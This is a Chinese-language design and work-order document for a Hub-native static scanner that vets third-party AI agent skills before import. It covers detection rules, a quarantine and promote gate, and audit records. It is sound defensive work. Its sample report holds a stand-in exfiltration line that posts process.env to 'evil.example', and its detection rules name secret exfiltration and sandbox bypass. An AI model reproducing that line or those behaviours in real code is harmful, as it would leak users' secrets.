# X-Hub Agent Skill Vetter Gate Work Orders v1

- Status: Active
- Updated: 2026-03-13
- Owner: Hub-L2（Primary）/ Hub-L5 / XT-L1 / Security / QA
- Purpose: 把“安装前先扫描 skill 风险”的能力正式纳入 `X-Hub` 导入治理主链，在不执行第三方代码的前提下，对第三方 Agent skill 做静态 vetting、分级隔离、审计留痕与 promote gate。
- Depends on:
  - `docs/xhub-skills-placement-and-execution-boundary-v1.md`
  - `docs/xhub-skills-discovery-and-import-v1.md`
  - `docs/xhub-skills-signing-distribution-and-runner-v1.md`
  - `x-terminal/work-orders/xt-w3-34-openclaw-skill-reuse-and-execution-surface-implementation-pack-v1.md`
  - `protocol/hub_protocol_v1.proto`
  - `x-hub/grpc-server/hub_grpc_server/src/skills_store.js`
  - `x-terminal/Sources/Project/XTAgentSkillImportNormalizer.swift`

## 0) 冻结结论

### 0.1 结论

1. 可以参考外部生态里“安装前先扫一遍”的思路，但 `X-Hub` 不能把安全 vetting 主权交给一个第三方 imported skill。
2. `skill-vetter` 在我们的体系里应被实现为 `Hub-native import vetter stage`，不是“先装一个 vetter skill，再让它判定别的 skill 能不能装”。
3. 任意第三方 Agent skill 都不能自证安全，也不能与被扫描对象共享 trust 主权。
4. `X-Terminal` 继续负责发现、normalize、基础 preflight；`X-Hub` 负责最终 vetter verdict、quarantine、promote gate、audit。
5. vetter 失败时默认 fail-closed，至少阻断 `promote`；命中 critical 规则时直接进入 `quarantine`。

### 0.2 为什么不能把 vetter 本身做成普通 skill

如果让一个普通 imported skill 来做“安全检查器”，会出现三个硬问题：

1. 它自己也需要先被信任，形成循环依赖。
2. 它的扫描规则、更新节奏、结果格式可能绕开 Hub audit / constitution。
3. 它一旦被投毒，等于直接拿到了“批准别的 skill 进入系统”的入口。

所以正确做法是：

- 参考外部实现的规则库与测试样本；
- 但把扫描引擎、判定阈值、quarantine 语义、promote gate 固定在 `X-Hub` 主链内。

## 1) 参考面与可直接借鉴的内容

来自本地参考仓库 `Opensource/openclaw-main` 的可借鉴内容：

- `src/agents/skills-install.ts`
  - 安装 skill 前运行目录级安全扫描
- `src/security/skill-scanner.ts`
  - 静态规则扫描器与 summary 聚合
- `src/security/skill-scanner.test.ts`
  - 可直接转化成我们回归样本的规则测试
- `src/commands/doctor-security.ts`
  - 安全告警分级与“修复提示”输出方式
- `src/agents/sandbox/validate-sandbox-security.ts`
  - 路径、bind mount、网络暴露等 fail-closed 校验思路

当前可直接吸收的规则类别：

- `dangerous-exec`
  - `child_process.exec/spawn` 一类命令执行
- `dynamic-code-execution`
  - `eval` / `new Function`
- `crypto-mining`
  - 挖矿协议或矿工关键字
- `potential-exfiltration`
  - 文件读取 + 网络发送组合
- `obfuscated-code`
  - 大片十六进制 / base64 解码载荷
- `env-harvesting`
  - `process.env` + 网络发送组合
- `suspicious-network`
  - 指向异常端口的 websocket 或可疑网络连接

### 1.1 实施快照（2026-03-12）

以下第一段能力已落到代码并通过定向测试：

- `HUB-VET-01` 初版 Hub-native 静态扫描器：
  - `x-hub/grpc-server/hub_grpc_server/src/agent_skill_vetter.js`
  - `x-hub/grpc-server/hub_grpc_server/src/agent_skill_vetter.test.js`
- 已覆盖的首批规则：
  - `dangerous-exec`
  - `dangerous-exec-python`
  - `dynamic-code-execution`
  - `shell-pipe-to-shell`
  - `unsafe-upstream-behavior`
  - `potential-exfiltration`
  - `env-harvesting`
  - `obfuscated-code`
  - `obfuscated-code-base64`
  - `crypto-mining`
  - `suspicious-network`
- 已成立的 summary verdict：
  - `critical -> critical`
  - `warn_count > 0 -> warn_only`
  - `0 findings -> passed`

仍待推进：

- 更丰富的恶意样本与误报率报表仍待补齐

以下第二段能力也已落到代码并通过定向验证：

- `HUB-VET-03` 第一版已接入：
  - `StageAgentImport(scan_input_json)` 支持 Hub-side static scan
  - stage 响应返回 `vetter_status / vetter_critical_count / vetter_warn_count / vetter_audit_ref`
  - `agent_import_record` 已写入：
    - `vetter_status`
    - `vetter_audit_ref`
    - `vetter_report_ref`
    - `vetter_critical_count`
    - `vetter_warn_count`
    - `promotion_blocked_reason`
- `HUB-VET-04` 第一版已接入：
  - `PromoteAgentImport` 对 `pending / scan_error / critical` 默认 fail-closed
  - 无 scan input 时默认 `agent_import_vetter_pending`
  - critical 扫描结果会把 import 直接压入 `quarantined`
- `XT-VET-05` 第一版已接入：
  - XT `Import Skills` 流程在本地复制成功后，会自动生成 `scan_input_json`
  - XT 会把 `manifest + findings + scan_input` 一并提交到 Hub `StageAgentImport`
  - 导入完成弹窗已回显 `status / preflight / vetter / counts / staging_id`
  - `GetAgentImportRecord` / review 结果面已结构化展示：
    - `audit_ref`
    - `requested_by`
    - `note`
    - `vetter_audit_ref`
    - `vetter_report_ref`
    - `critical/warn count`
    - `enabled_scope`
    - findings 摘要
  - 实现落点：
    - `x-terminal/Sources/Project/XTAgentSkillImportNormalizer.swift`
    - `x-terminal/Sources/AppModel.swift`
    - `x-terminal/Tests/XTAgentSkillImportNormalizerTests.swift`

## 2) 正式流程

### 2.1 目标流程

`发现上游 skill -> XT normalize/preflight -> Hub stage -> Hub-native vetter scan -> policy merge -> staged/quarantined -> trust/pin/promote -> XT resolved snapshot -> governed execute`

### 2.2 分步定义

1. `X-Terminal` 导入本地目录或上游包。
2. `X-Terminal` 运行 `XTAgentSkillImportNormalizer`，生成：
   - `xt.agent_skill_import_manifest.v1`
   - preflight findings
3. `X-Terminal` 将 manifest / findings / source package ref 提交到 Hub `StageAgentImport`。
4. `X-Hub` 在 staging 区生成 import record，同时触发 `Hub-native vetter`：
   - 解包到临时镜像目录或读取上传后的受控副本
   - 只做静态分析，不执行第三方代码
   - 生成结构化 vetter report
5. `X-Hub` 用统一策略合并：
   - XT preflight findings
   - Hub vetter findings
   - trusted publisher / signature / revoke / grant / policy_scope
6. Hub 产出最终导入状态：
   - `quarantined`
   - `staged`
   - `staged_with_warnings`
   - `scan_error_blocked`
7. 只有 `vetter_status=passed|warn_only` 且未命中 revoke/quarantine 的记录，才允许 `PromoteAgentImport`。
8. Promote 成功后，Terminal 只能消费 Hub 解析出的 resolved snapshot；不得绕开 vetter 直接使用原始目录。

## 3) 机读契约冻结

### 3.1 `xhub.agent_skill_vetter_report.v1`

```json
{
  "schema_version": "xhub.agent_skill_vetter_report.v1",
  "staging_id": "agent-1741747200000-deadbeefcafe",
  "scanner_version": "hub.agent.vetter.v1",
  "status": "passed|warn_only|critical|scan_error",
  "summary": {
    "scanned_files": 14,
    "critical_count": 1,
    "warn_count": 2,
    "info_count": 0
  },
  "findings": [
    {
      "rule_id": "env-harvesting",
      "severity": "critical",
      "file": "dist/index.js",
      "line": 18,
      "message": "Environment variable access combined with network send",
      "evidence": "fetch(\"https://evil.example\", { body: JSON.stringify(process.env) })"
    }
  ],
  "audit_ref": "audit-agent-vetter-deadbeefcafe",
  "generated_at_ms": 1741747200456
}
```

### 3.2 `xhub.agent_import_record.v1` 增量字段

不改主 schema 名称，先做 additive fields：

```json
{
  "vetter_status": "pending|passed|warn_only|critical|scan_error",
  "vetter_audit_ref": "audit-agent-vetter-deadbeefcafe",
  "vetter_report_ref": "skills_store/agent_imports/reports/agent-...json",
  "vetter_critical_count": 1,
  "vetter_warn_count": 2,
  "promotion_blocked_reason": "vetter_critical_findings"
}
```

### 3.3 Promote Gate 规则

- `vetter_status=critical` -> `quarantined`
- `vetter_status=scan_error` -> 阻断 `promote`
- `vetter_status=pending` -> 阻断 `promote`
- `vetter_status=warn_only` -> 可继续，但必须保留 warnings 与 audit refs
- `vetter_status=passed` -> 正常进入 trust/pin/promote 链

## 4) 可执行粒度工单

### 4.1 `HUB-VET-01` 扫描规则集冻结

- Priority: `P0`
- Goal: 冻结首批 Hub-native vetter 规则集，确保 critical / warn 判定语义稳定。
- Recommended code:
  - `x-hub/grpc-server/hub_grpc_server/src/agent_skill_vetter.js`
  - `x-hub/grpc-server/hub_grpc_server/src/agent_skill_vetter.test.js`
- Steps:
  1. 移植并裁剪参考仓库里的静态规则。
  2. 补充我们自己的 denylist：
     - prompt mutation 指令片段
     - unrestricted host exec hints
     - secrets exfiltration patterns
     - sandbox / grant bypass hints
  3. 输出统一 severity：`info|warn|critical`
  4. 冻结 rule_id，后续只允许增量新增，不允许随意改名。
- DoD:
  - 同一输入目录重复扫描结果稳定
  - rule_id 与 severity 全部有测试
  - critical 规则命中后可稳定映射到 quarantine

### 4.2 `HUB-VET-02` Staging 镜像与静态扫描输入面

- Priority: `P0`
- Goal: 让 Hub 在不执行第三方代码的前提下，对导入 skill 有稳定扫描输入。
- Steps:
  1. 统一 staging mirror 目录：
     - `skills_store/agent_imports/mirror/<staging_id>/`
  2. 仅允许扫描受控副本或上传包解出的只读镜像。
  3. 禁止直接对 Terminal 原始路径做 Hub-side trust 决策。
  4. mirror 生命周期与 import record 绑定，便于复查与审计。
- DoD:
  - Hub 扫描源可复现
  - mirror 丢失时 `promote` fail-closed
  - 不需要执行第三方代码即可完成扫描

### 4.3 `HUB-VET-03` StageAgentImport 集成

- Priority: `P0`
- Goal: `StageAgentImport` 不再只是写 manifest，而是写入 vetter verdict。
- Recommended code:
  - `x-hub/grpc-server/hub_grpc_server/src/skills_store.js`
  - `x-hub/grpc-server/hub_grpc_server/src/services.js`
  - `protocol/hub_protocol_v1.proto`
- Steps:
  1. 在 stage 完成后写入 `vetter_status=pending`。
  2. 对 staging mirror 运行 Hub-native vetter。
  3. 将结果写回 record additive fields。
  4. 若 critical > 0，则 record 直接进入 `quarantined`。
  5. Stage RPC 响应返回：
     - `vetter_status`
     - `vetter_critical_count`
     - `vetter_warn_count`
     - `vetter_audit_ref`
- DoD:
  - Stage response 可直接告诉 XT “已隔离 / 已警告 / 可继续”
  - 无 vetter report 时不能伪装 staged success

### 4.4 `HUB-VET-04` Promote Gate + Override 模型

- Priority: `P0`
- Goal: 未通过 vetter 的导入记录不能进入 enabled pin。
- Steps:
  1. `PromoteAgentImport` 增加 vetter gate。
  2. `critical/pending/scan_error` 一律阻断。
  3. `warn_only` 允许继续，但必须保留 override 审计和 note。
  4. 后续如需要人工 override，必须显式受：
     - supervisor high-risk grant
     - Hub audit
     - revocable pin
- DoD:
  - 无法通过 CLI/RPC 绕开 promote gate
  - override 事件可检索、可追责、可撤销

### 4.5 `XT-VET-05` Terminal 导入 UI 结果面

- Priority: `P1`
- Goal: 用户在 XT 导入技能后，能直接看到 Hub vetter 结果，而不是只看到“复制成功”。
- Recommended code:
  - `x-terminal/Sources/AppModel.swift`
  - `x-terminal/Sources/Hub/HubIPCClient.swift`
- Implementation snapshot:
  - 2026-03-13 已补 `XTAgentSkillImportReviewFormatter`，`GetAgentImportRecord` 的 review 文案改为统一结构化输出。
  - 当前已显示 `staging_id / status / audit_ref / requested_by / note / preflight / vetter / vetter_counts / vetter_audit_ref / vetter_report_ref / blocked_reason / enabled_package / enabled_scope / capabilities / findings`。
- Steps:
  1. `importSkills()` 流程接入 stage RPC。
  2. UI 展示：
     - `preflight_status`
     - `vetter_status`
     - `staging_id`
     - `audit_ref`
     - `critical/warn count`
  3. 对 `quarantined` 给出明确拦截原因和下一步。
  4. 对 `warn_only` 给出“查看明细 / 继续审批”入口。
- DoD:
  - 用户能区分“导入成功”和“已被 Hub 隔离”
  - 结果不是只落日志，必须有 UI 或导出结果面
  - review 字段与 Hub additive record 对齐，新增 vetter 字段时不再需要在 UI 里重复拼装解析逻辑

### 4.6 `HUB-VET-06` 审计与证据链

- Priority: `P1`
- Goal: 每次 vetter 判定都能被复盘。
- Steps:
  1. 新增 audit event：
     - `skills.agent_import.vetter_started`
     - `skills.agent_import.vetter_completed`
     - `skills.agent_import.vetter_quarantined`
     - `skills.agent_import.promote_blocked`
  2. vetter report 落本地 JSON evidence。
  3. Hub memory / board 接收 summary refs，而不是长日志全文。
- DoD:
  - 同一 `staging_id` 可反查完整 vetter verdict
  - quarantine 原因可在审计里稳定检索

### 4.7 `QA-VET-07` 恶意样本与误报率回归

- Priority: `P1`
- Goal: 避免规则只会“看起来安全”，却没有稳定回归基线。
- Steps:
  1. 用参考仓库中的 scanner tests 作为第一批语料。
  2. 新增我们自己的样本：
     - prompt injection helper
     - key exfiltration helper
     - fake browser auto-send action
     - sandbox bypass hint
  3. 统计：
     - `vetter_critical_detection_rate`
     - `vetter_warn_precision`
     - `vetter_false_positive_rate`
- DoD:
  - 恶意样本命中率满足门槛
  - 误报率有机判报告，不靠口头判断

## 5) 与现有导入链的关系

### 5.1 不替代 XT preflight

`XTAgentSkillImportNormalizer` 负责：

- world-writable path
- symlink escape
- unsafe upstream behavior
- direct local execution deny

这一步保留，因为它最接近用户本地目录与导入入口。

### 5.2 Hub vetter 是第二道关

Hub vetter 负责：

- 代码级静态规则扫描
- package/mirror 级证据固化
- promote gate
- quarantine / override / audit 主权

两者关系不是二选一，而是：

`XT preflight` + `Hub vetter` + `Hub trust/pin/revoke` + `XT governed execute`

## 6) 立刻推进顺序

1. `HUB-VET-01`：新增 `agent_skill_vetter.js` + 定向测试。
2. `HUB-VET-03`：把 `StageAgentImport` 响应补齐 `vetter_status`。
3. `HUB-VET-04`：让 `PromoteAgentImport` 默认受 vetter gate 阻断。
4. `XT-VET-05`：把 XT 导入 UI 从“本地复制成功”升级到“Hub 已扫描并给出 verdict”。

## 7) Definition of Done

- 任意第三方 Agent skill 在进入 enabled 之前，必须有一份可追溯的 Hub vetter report。
- `critical` 样本不能进入 enabled pin。
- `scan_error` 不能静默放行。
- XT 用户可见导入结果必须包含 Hub vetter verdict。
- 断网离线时不得做新的 vetter trust 决策；仅可继续使用既有已解析缓存。
